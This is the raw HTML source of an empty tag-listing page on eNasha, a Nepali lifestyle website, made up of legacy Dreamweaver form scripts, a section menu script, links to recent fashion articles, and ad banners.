
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>eNasha : Articles Related to  in  </title>
<link href="enashacss/enasha.css" rel="stylesheet" type="text/css" />


 
  <script type="text/JavaScript">
<!--
function MM_jumpMenu(targ,selObj,restore){ //v3.0
  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
  if (restore) selObj.selectedIndex=0;
}
//-->
  </script>
</head>

<body>

<table width="1004" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td valign="top">
	  <table width="1004" border="0" cellspacing="0" cellpadding="0">
<tr></tr>
<tr>
  <td height="140" align="center"><a href="http://www.enasha.com"><img src="jainepal/stepup4_top.jpg" width="1004" height="140" border="0" /></a></td>
</tr>
</table>
</td>
  </tr>
  
  <tr>
    <td valign="top" background="main/images/main/line_bar.jpg"><img src="main/images/transdot.gif" width="3" height="1" /></td>
  </tr>
  <tr>
    <td valign="top"><table width="1004" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="566" valign="top"><table width="546" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td width="436" height="35" class="body1"><a href="index.php" class="bc-navigation">Home</a>&raquo;
                </td>
            <td width="114" class="body1">
                      <div align="right">
                        <table width="100%" border="0" cellspacing="0" cellpadding="0"><form name="form2" id="form2">
                          <tr>
                            <td><!--select name="sections" class="body1" onchange="MM_jumpMenu('parent',this,0)">
                              <option value="#">Select Channel</option>
                              
                              <option value="section.php?channel="></option>
                                                          </select!--></td>
                          </tr></form>
                        </table>
                      </div>            </td>
          </tr>
          <tr>
            <td colspan="2"></td>
          </tr>
          <tr>
            <td height="35" colspan="2" class="bigtitle"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td class="title-latest-articles">Articles Related to  in  <a href="tag-details.php?group_id="><strong></strong></a></td>
                  </tr>
            </table></td>
          </tr>
          <tr>
            <td colspan="2" valign="top"><table width="546"  border="0" cellspacing="0" cellpadding="0">
                <!--if three colums is filled then -->
                <tr valign="top">
                                    <!--Three Column Created-->
                </tr>
            </table></td>
          </tr>
          <tr>
            <td colspan="2"></td>
          </tr>
          <tr>
            <td colspan="2"><center>
                <table width=100%  border=0 cellpadding=0 cellspacing=0><tr><td>Data 0 - 0 of 0 [Total 0 Pages]</td></tr></table> 
 <table border='0' cellpadding='2' cellspacing='2'><tr></tr></table>
            </center></td>
          </tr>
          <tr>
            <td colspan="2" valign="top"><table width="546" height="36"  border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td height="12" align="left" valign="top">&nbsp;</td>
                </tr>
                <tr>
                  <td height="12" align="left" valign="top"><span class="blackbody"><img src="images/buynsellad_new.jpg" width="550" height="402" border="0" usemap="#Map" /></span>
                      <map name="Map" id="Map2">
                        <area shape="rect" coords="19,268,259,382" href="http://www.enasha.com/buyandsell/" />
                        <area shape="rect" coords="291,264,535,384" href="http://www.enasha.com/buyandsell/" />
                      </map>
                      <map name="Map" id="Map">
                        <area shape="rect" coords="19,268,259,382" href="http://www.enasha.com/buyandsell/" />
                        <area shape="rect" coords="291,264,535,384" href="http://www.enasha.com/buyandsell/" />
                        </map>
                  </td></tr>
                <tr>
                  <td height="12" align="left" valign="top"><div align="center"> </div></td>
                </tr>
            </table></td>
          </tr>
          <tr>
            <td colspan="2"></td>
          </tr>
          <tr>
            <td height="210" colspan="2" background="http://www.enasha.com/main/images/bg_refer_page.jpg" class="title-orange"><script type="text/JavaScript">
<!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
  } if (errors) alert('The following error(s) occurred:\n'+errors);
  document.MM_returnValue = (errors == '');
}
//-->
</script>

<table width="546" border="0" cellpadding="0" cellspacing="0" background="http://www.enasha.com/main/images/bg_refer_page.jpg">
  <tr>
    <td>
      <table width="500" border="0" align="center" cellpadding="1" cellspacing="0"><form action="" method="post" name="form1" id="form1">
        <tr>
          <td height="50" class="photo-caption">&nbsp;</td>
          <td class="photo-caption"></td>
          <td class="photo-caption">&nbsp;</td>
          <td class="photo-caption">&nbsp;</td>
          <td class="photo-caption">&nbsp;</td>
        </tr>
        <tr>
          <td class="photo-caption"><div align="center">YOURS</div></td>
          <td class="photo-caption">Name</td>
          <td class="photo-caption"><input name="yourname" type="text" class="photo-caption" id="yourname" size="20" /></td>
          <td class="photo-caption"><div align="center">Email</div></td>
          <td class="photo-caption"><input name="email1" type="text" class="photo-caption" id="email1" size="35" /></td>
        </tr>
        <tr>
          <td colspan="5" class="photo-caption"><img src="../../main/images/transdot.gif" width="2" height="7" /></td>
        </tr>
        <tr>
          <td width="82" class="photo-caption"><div align="center">Friend 1 </div></td>
          <td width="32" class="photo-caption"><div align="left">Name</div></td>
          <td width="140" class="photo-caption"><input name="friend1" type="text" class="photo-caption" id="friend1" size="20" /></td>
          <td width="33" class="photo-caption"><div align="center">Email</div></td>
          <td width="203" class="photo-caption"><input name="email2" type="text" class="photo-caption" id="email2" size="35" /></td>
        </tr>
        <tr>
          <td class="photo-caption"><div align="center">Friend 2 </div></td>
          <td class="photo-caption">Name</td>
          <td class="photo-caption"><input name="friend2" type="text" class="photo-caption" id="friend2" size="20" /></td>
          <td class="photo-caption"><div align="center">Email</div></td>
          <td class="photo-caption"><input name="email3" type="text" class="photo-caption" id="email3" size="35" /></td>
        </tr>
        <tr>
          <td class="photo-caption"><div align="center">Friend 3 </div></td>
          <td class="photo-caption">Name</td>
          <td class="photo-caption"><input name="friend3" type="text" class="photo-caption" id="friend3" size="20" /></td>
          <td class="photo-caption"><div align="center">Email</div></td>
          <td class="photo-caption"><input name="email4" type="text" class="photo-caption" id="email4" size="35" /></td>
        </tr>
        <tr>
          <td class="photo-caption">&nbsp;</td>
          <td class="photo-caption">&nbsp;</td>
          <td height="45" class="photo-caption"><input name="image" type="image" onclick="MM_validateForm('yourname','','R','email1','','RisEmail','friend1','','R','email2','','RisEmail');return document.MM_returnValue" src="main/images/buttn_pt_send.jpg" width="86" height="30" /></td>
          <td class="photo-caption"><div align="center"></div></td>
          <td class="photo-caption">&nbsp;</td>
        </tr></form>
      </table>
    </td>
  </tr>
</table>
</td>
          </tr>
          <tr>
            <td colspan="2">&nbsp;</td>
          </tr>
          <tr>
            <td height="210" colspan="2" background="http://www.enasha.com/main/images/bg_post_comment.jpg" class="title-orange"><script type="text/JavaScript">
<!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
  } if (errors) alert('The following error(s) occurred:\n'+errors);
  document.MM_returnValue = (errors == '');
}
//-->
</script>



  <table width="546" border="0" cellpadding="6" cellspacing="0" background="http://www.enasha.com/main/images/bg_post_comment.jpg">
    <tr>
      <td><table width="100%" border="0" align="center" cellpadding="2" cellspacing="0">
        <form id="comments" name="comments" method="post" action="">
          <tr>
            <td height="40" class="photo-caption">&nbsp;</td>
            <td colspan="3"><span class="bodyarticle"> </span></td>
          </tr>
          <tr>
            <td width="105" class="photo-caption">Your Name: </td>
            <td colspan="3"><span class="photo-caption">
              <input name="name" type="text" class="photo-caption" id="name" size="20" />
              City
              <input name="city" type="text" class="photo-caption" id="city" size="15" />
              Country
              <input name="country" type="text" class="photo-caption" id="country" size="15"/>
            </span></td>
          </tr>
          <tr>
            <td class="photo-caption">Your Email: </td>
            <td width="152"><span class="photo-caption">
              <input name="mail" type="text" class="photo-caption" id="mail" size="25" />
            </span></td>
            <td width="123"><div align="right"><span class="photo-caption">Rate this Article:&nbsp; </span></div></td>
            <td width="104"><div align="left">
                <select name="rate" class="photo-caption" id="rate">
                  <option selected="selected">RATE HERE</option>
                  <option>Excellent</option>
                  <option>Very Good</option>
                  <option>Good</option>
                  <option>Average</option>
                  <option>Poor</option>
                </select>
            </div></td>
          </tr>
          <tr>
            <td valign="top" class="photo-caption">Comments: </td>
            <td colspan="3"><textarea name="comments" cols="50" rows="3" id="comments"></textarea></td>
          </tr>
          <tr>
            <td valign="top" class="photo-caption">&nbsp;</td>
            <td height="35" colspan="3" valign="middle"><label>
              <input name="submit" type="image" id="submit" onclick="MM_validateForm('name','','R','country','','R','mail','','R');return document.MM_returnValue" src="main/images/buttn_post.jpg" />
            </label></td>
          </tr>
        </form>
      </table></td>
    </tr>
  </table>
  </td>
          </tr>
          <tr>
            <td colspan="2">  <tr><td colspan="2" >&nbsp;</td></tr>
 <tr>
<td colspan="2"><span class="article-title1">Latest Articles posted in the site</span></td>
          </tr>
		   <tr><td colspan="2" >&nbsp;&nbsp;</td></tr>
          <tr>
            <td colspan="2"><table width="546" border="0" cellspacing="0" cellpadding="0">
                <tr valign="top">
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="149" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3500"> <img src="uploaded/tn_3500.jpg" width="149" height="149" border="0"/></a>
                            </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td><span class="article-listbox-article-title"><strong><span class="article-listbox-section-title"><a href="article.php?id=3500">Sonitpur Saanjh 2068</a></span></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                  <td width="5">&nbsp;</td>
                  <td width="177"><table width="179" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="149" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3499"> <img src="uploaded/tn_3499.jpg" width="149" height="149" border="0"/></a>
                              </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3499">Style Check Dashain Fashion 2011</a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                  <td width="5">&nbsp;</td>
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="149" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3498"> <img src="uploaded/tn_3498.jpg" width="149" height="149" border="0"/></a>
                                </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3498">Style Check Dashain Fashion 2011</a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                </tr>
            </table></td>
          </tr>
          <tr>
            <td colspan="2">&nbsp;</td>
          </tr>
          <tr>
            <td colspan="2"><table width="546" border="0" cellspacing="0" cellpadding="0">
                <tr valign="top">
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="155" height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3497"> <img src="uploaded/tn_3497.jpg" width="149" height="149" border="0"/></a>
                                  </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3497">Style Check Dashain Fashion 2011</a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                  <td width="5">&nbsp;</td>
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="155" height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3496"> <img src="uploaded/tn_3496.jpg" width="149" height="149" border="0"/></a>
                               </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3496"><b>Style Check Dashain Fashion 2011</b></a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                  <td width="5">&nbsp;</td>
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="155" height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3495"> <img src="uploaded/tn_3495.jpg" width="149" height="149" border="0"/></a>
                                </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3495"><b>Style Check Dashain Fashion 2011</b></a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                </tr>
            </table></td>
          </tr>
          <tr>
            <td colspan="2">&nbsp;</td> </tr></td>
          </tr>
          <tr>
            <td colspan="2" height="3"></td>
          </tr>
          <tr>
            <td colspan="2" align="right"><a href="latest_articles.php?published=Yes&amp;pageno=1"><img src="images/buttn_morearticle.gif" width="135" height="28" border="0" /></a>&nbsp;&nbsp;</td>
          </tr>
          <tr>
            <td colspan="2">&nbsp;</td>
          </tr>
        </table></td>
        <td width="172" valign="top" bgcolor="#dbdbdb"><table width="172"  border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="172" valign="top"><!--Channel Menu-->
			<table width="172"  border="0" align="left" cellpadding="0" cellspacing="0">
              <tr>
                <td valign="top"><img src="images/channel-head.jpg" width="172" height="37" /></td>
              </tr>
              <tr>
                <td  width="172" height="27" valign="top" class="channel-table-Bg">
				
				
				<table width="172"  border="0" cellpadding="0" cellspacing="0">
                  <tr valign="top">
                    <td width="172" height="27"><table width="172"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
					                          <td height="333.6" valign="top">
                        <script type='text/javascript' src='menu_com.js'></script> <script type='text/javascript'>
function Go(){return}
                        </script>
                          <script language="javascript">
/***********************************************************************************
*	(c) Ger Versluis 2000 version 5.411 24 December 2001 (updated Jan 31st, 2003 by Dynamic Drive for Opera7)
*	For info write to menus@burmees.nl		          *
*	You may remove all comments for faster loading	          *		
***********************************************************************************/
	var NoOffFirstLineMenus=5;			// Number of first level items
	var LowBgColor='#668ecc';			// Background color when mouse is not over
	var LowSubBgColor='#719ee2';			// Background color when mouse is not over on subs
	var HighBgColor='#2a4b8e';			// Background color when mouse is over
	var HighSubBgColor='#2a4b8e';			// Background color when mouse is over on subs
	var FontLowColor='white';			// Font color when mouse is not over
	var FontSubLowColor='white';			// Font color subs when mouse is not over
	var FontHighColor='white';			// Font color when mouse is over
	var FontSubHighColor='white';			// Font color subs when mouse is over
	var BorderColor='white';			// Border color
	var BorderSubColor='white';			// Border color for subs
	var BorderWidth=1;				// Border width
	var BorderBtwnElmnts=1;			// Border between elements 1 or 0
	var FontFamily="arial,comic sans ms,technical"	// Font family menu items
	var FontSize=9;				// Font size menu items
	var FontBold=1;				// Bold menu items 1 or 0
	var FontItalic=0;				// Italic menu items 1 or 0
	var MenuTextCentered='left';			// Item text position 'left', 'center' or 'right'
	var MenuCentered='left';			// Menu horizontal position 'left', 'center' or 'right'
	var MenuVerticalCentered='top';		// Menu vertical position 'top', 'middle','bottom' or static
	var ChildOverlap=-.0001;				// horizontal overlap child/ parent
	var ChildVerticalOverlap=0;			// vertical overlap child/ parent
	var StartTop=178;				// Menu offset x coordinate
	var StartLeft=565;				// Menu offset y coordinate
	var VerCorrect=0;				// Multiple frames y correction
	var HorCorrect=0;				// Multiple frames x correction
	var LeftPaddng=16;				// Left padding
	var TopPaddng=6;				// Top padding
	var FirstLineHorizontal=0;			// SET TO 1 FOR HORIZONTAL MENU, 0 FOR VERTICAL
	var MenuFramesVertical=1;			// Frames in cols or rows 1 or 0
	var DissapearDelay=1000;			// delay before menu folds in
	var TakeOverBgColor=1;			// Menu frame takes over background color subitem frame
	var FirstLineFrame='navig';			// Frame where first level appears
	var SecLineFrame='space';			// Frame where sub levels appear
	var DocTargetFrame='space';			// Frame where target documents appear
	var TargetLoc='';				// span id for relative positioning
	var HideTop=0;				// Hide first level when loading new document 1 or 0
	var MenuWrap=1;				// enables/ disables menu wrap 1 or 0
	var RightToLeft=1;				// enables/ disables right to left unfold 1 or 0
	var UnfoldsOnClick=0;			// Level 1 unfolds onclick/ onmouseover
	var WebMasterCheck=0;			// menu tree checking on or off 1 or 0
	var ShowArrow=1;				// Uses arrow gifs when 1
	var KeepHilite=1;				// Keep selected path highligthed
	var Arrws=['menuimages/menu_arrow.gif',10,5,'menuimages/menu_arrow.gif',10,5,'menuimages/menu_arrow.gif',16,12];	// Arrow source, width and height

function BeforeStart(){return}
function AfterBuild(){return}
function BeforeFirstOpen(){return}
function AfterCloseAll(){return}



// Menu tree
//	MenuX=new Array(Text to show, Link, background image (optional), number of sub elements, height, width);
//	For rollover images set "Text to show" to:  "rollover:Image1.jpg:Image2.jpg"
NoOffFirstLineMenus=12;
Menu1 = new Array("Around the World","section_new.php?section_id=2&pageno=1","",6,27,172);
  Menu1_1 = new Array("For Your Eyes Only","section_new.php?section_id=75&pageno=1","",0,27,160);
  Menu1_2 = new Array("Places of Nepal","section_new.php?section_id=76&pageno=1","",0,27,160);
  Menu1_3 = new Array("Super Interesting","section_new.php?section_id=22&pageno=1","",0,27,160);
  Menu1_4 = new Array("Weird and Interesting","section_new.php?section_id=20&pageno=1","",0,27,160);
  Menu1_5 = new Array("New n Edgy","section_new.php?section_id=21&pageno=1","",0,27,160);
  Menu1_6 = new Array("Bachelor Dude Column","section_new.php?section_id=23&pageno=1","",0,27,160);
Menu2 = new Array("People","section_new.php?section_id=5&pageno=1","",5,27,172);
  Menu2_1 = new Array("Bachelor n Bachelorette","http://www.enasha.com/bnb.php","",0,27,160);
  Menu2_2 = new Array("Close Encounter","section_new.php?section_id=50&pageno=1","",0,27,160);
  Menu2_3 = new Array("Personality","section_new.php?section_id=51&pageno=1","",0,27,160);
  Menu2_4 = new Array("Hot Dish","section_new.php?section_id=52&pageno=1","",0,27,160);
  Menu2_5 = new Array("People Who Chose Nepal","section_new.php?section_id=53&pageno=1","",0,27,160);
Menu3 = new Array("Life Style","section_new.php?section_id=4&pageno=1","",16,27,172);
  Menu3_1 = new Array("Main","section_new.php?section_id=29&pageno=1","",0,27,160);
  Menu3_2 = new Array("Emotional Intelligence","section_new.php?section_id=30&pageno=1","",0,27,160);
  Menu3_3 = new Array("Self Improvement","section_new.php?section_id=31&pageno=1","",0,27,160);
  Menu3_4 = new Array("Leisure","section_new.php?section_id=32&pageno=1","",0,27,160);
  Menu3_5 = new Array("Relationship","section_new.php?section_id=33&pageno=1","",0,27,160);
  Menu3_6 = new Array("Fashion n Grooming","section_new.php?section_id=34&pageno=1","",4,27,160);
    Menu3_6_1 = new Array("Style Check","section_new.php?section_id=35&pageno=1","",0,27,160);
    Menu3_6_2 = new Array("Fashion Police","section_new.php?section_id=36&pageno=1","",0,27,160);
    Menu3_6_3 = new Array("Feature","section_new.php?section_id=37&pageno=1","",0,27,160);
    Menu3_6_4 = new Array("Grooming","section_new.php?section_id=38&pageno=1","",0,27,160);
  Menu3_7 = new Array("Work n Office","section_new.php?section_id=39&pageno=1","",0,27,160);
  Menu3_8 = new Array("Health","section_new.php?section_id=40&pageno=1","",0,27,160);
  Menu3_9 = new Array("Fun n Humor","section_new.php?section_id=41&pageno=1","",0,27,160);
  Menu3_10 = new Array("Body and Mind","section_new.php?section_id=42&pageno=1","",0,27,160);
  Menu3_11 = new Array("Interior/Exterior","section_new.php?section_id=43&pageno=1","",0,27,160);
  Menu3_12 = new Array("Misc","section_new.php?section_id=44&pageno=1","",0,27,160);
  Menu3_13 = new Array("Wine and Dine","section_new.php?section_id=45&pageno=1","",0,27,160);
  Menu3_14 = new Array("Travels","section_new.php?section_id=46&pageno=1","",0,27,160);
  Menu3_15 = new Array("Pets","section_new.php?section_id=47&pageno=1","",0,27,160);
  Menu3_16 = new Array("Something To Think About","section_new.php?section_id=48&pageno=1","",0,27,160);
Menu4 = new Array("Technology","section_new.php?section_id=13&pageno=1","",5,27,172);
  Menu4_1 = new Array("Mobile","section_new.php?section_id=17&pageno=1","",2,27,160);
    Menu4_1_1 = new Array("Articles","section_new.php?section_id=71&pageno=1","",0,27,160);
    Menu4_1_2 = new Array("The Buzz","section_new.php?section_id=72&pageno=1","",0,27,160);
  Menu4_2 = new Array("Articles","section_new.php?section_id=61&pageno=1","",0,27,160);
  Menu4_3 = new Array("Gadget","section_new.php?section_id=62&pageno=1","",0,27,160);
  Menu4_4 = new Array("Online World","section_new.php?section_id=63&pageno=1","",0,27,160);
  Menu4_5 = new Array("Buying Tips","section_new.php?section_id=64&pageno=1","",0,27,160);
Menu5 = new Array("City Life","section_new.php?section_id=3&pageno=1","",4,27,172);
  Menu5_1 = new Array("Updates","section_new.php?section_id=25&pageno=1","",0,27,160);
  Menu5_2 = new Array("Weekend Movie Watch","section_new.php?section_id=26&pageno=1","",0,27,160);
  Menu5_3 = new Array("Horoscope","section_new.php?section_id=27&pageno=1","",0,27,160);
  Menu5_4 = new Array("City Sighting","section_new.php?section_id=24&pageno=1","",0,27,160);
Menu6 = new Array("Cars","http://www.enasha.com/cars.php","",2,27,172);
  Menu6_1 = new Array("Main Articles","section_new.php?section_id=57&pageno=1","",0,27,160);
  Menu6_2 = new Array("Articles","section_new.php?section_id=58&pageno=1","",0,27,160);
Menu7 = new Array("Bikes","http://www.enasha.com/bikes.php","",0,27,172);
Menu8 = new Array("Music","section_new.php?section_id=12&pageno=1","",2,27,172);
  Menu8_1 = new Array("Biography","section_new.php?section_id=59&pageno=1","",0,27,160);
  Menu8_2 = new Array("Feature","section_new.php?section_id=60&pageno=1","",0,27,160);
Menu9 = new Array("Bazaar","section_new.php?section_id=14&pageno=1","",2,27,172);
  Menu9_1 = new Array("News","section_new.php?section_id=18&pageno=1","",0,27,160);
  Menu9_2 = new Array("Offers","section_new.php?section_id=19&pageno=1","",0,27,160);
Menu10 = new Array("Television","section_new.php?section_id=15&pageno=1","",2,27,172);
  Menu10_1 = new Array("Feature","section_new.php?section_id=67&pageno=1","",0,27,160);
  Menu10_2 = new Array("Biography","section_new.php?section_id=68&pageno=1","",0,27,160);
Menu11 = new Array("Cinema","section_new.php?section_id=9&pageno=1","",3,27,172);
  Menu11_1 = new Array("Feature","section_new.php?section_id=54&pageno=1","",0,27,160);
  Menu11_2 = new Array("Biography","section_new.php?section_id=55&pageno=1","",0,27,160);
  Menu11_3 = new Array("Review","section_new.php?section_id=56&pageno=1","",0,27,160);
Menu12 = new Array("Sports","section_new.php?section_id=16&pageno=1","",2,27,172);
  Menu12_1 = new Array("Cricket","section_new.php?section_id=69&pageno=1","",0,27,160);
  Menu12_2 = new Array("Football","section_new.php?section_id=70&pageno=1","",0,27,160);
</script>                        <script type='text/javascript' src='menu_com.js'></script></td>
                      </tr>
                    </table></td>
                  </tr>
                 
                </table></td>
  </tr>
 
</table>			<!--Channel Menu END-->			</td>
          </tr>
          <tr>
            <td valign="top">
			<link href="enashacss/enasha.css" rel="stylesheet" type="text/css" />
<table width="172"  border="0" cellspacing="0" cellpadding="0">
  <tr> 
    <td height="22"><div align="center"></div></td>
  </tr>
  <tr> 
    <td valign="top"><img src="main/images/transdot.gif" width="3" height="9" /></td>
  </tr>
  <tr> 
    <td align="left" valign="top"> 
          </td>
  </tr>
  <tr> 
    <td valign="top"><img src="main/images/transdot.gif" width="3" height="9" /></td>
  </tr>
  <tr> 
    <td align="center" valign="top"><a href="http://www.enasha.com/section_new.php?section_id=35"><img src="ads/style_check_ufo.jpg" width="160" height="295" border="0" /></a><a href="http://www.enasha.com/section_new.php?section_id=35&amp;pageno=1"></a><a href="http://www.enasha.com/subsection_details.php?channel=Lifestyle &amp;section=Fashion and Grooming&amp;subsection=Style Check&amp;pageno=1"></a></td>
  </tr>
  <tr>
    <td valign="top"><img src="main/images/transdot.gif" width="3" height="9" /></td>
  </tr>
  <tr> 
    <td width="172" valign="top"><img src="main/images/transdot.gif" width="3" height="9" /></td>
  </tr>
</table>
			</td>
          </tr>
        </table></td>
        <td width="266" align="center" valign="top"><script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
<div align="left"></div>
<table  border="0" cellspacing="0" cellpadding="0">
  <tr> 
    <td></td>
  </tr>
  <tr> 
    <td valign="top"><a href="http://www.qfxcinemas.com/" target="_blank"><img src="/jainepal/stepup4_right.jpg" width="251" height="327" border="0" /></a></td>
  </tr>
  <tr> 
    <td><img src="main/images/transdot.gif" width="3" height="9" /></td>
  </tr>
  <tr> 
    <td><script type="text/javascript">
AC_FL_RunContent( 'codebase','http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0','width','250','height','165','src','http://www.enasha.com/ads/ud_banner','quality','high','pluginspage','http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash','movie','http://www.enasha.com/ads/ud_banner' ); //end AC code
</script> <noscript>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="250" height="165">
        <param name="movie" value="http://www.enasha.com/ads/ud_banner.swf" />
        <param name="quality" value="high" />
        <embed src="http://www.enasha.com/ads/ud_banner.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="250" height="165"></embed> 
      </object>
      </noscript></td>
  </tr>
  <tr>
    <td><img src="main/images/transdot.gif" alt="" width="3" height="9" /></td>
  </tr>
  <tr>
    <td><a href="http://www.ultimatedecor.com.np" target="_blank"><img src="ads/ultimatedecor_9nov.jpg" width="250" height="137" border="0" /></a></td>
  </tr>
  <tr> 
    <td><img src="main/images/transdot.gif" width="3" height="9" /></td>
  </tr>
  <tr> 
    <td>&nbsp;</td>
  </tr>
  <tr> 
    <td><div align="center"> 
        <link href="enashacss/enasha.css" rel="stylesheet" type="text/css" />
<table width="250" border="0" cellpadding="5" cellspacing="0" bgcolor="ffffff">
  <tr>
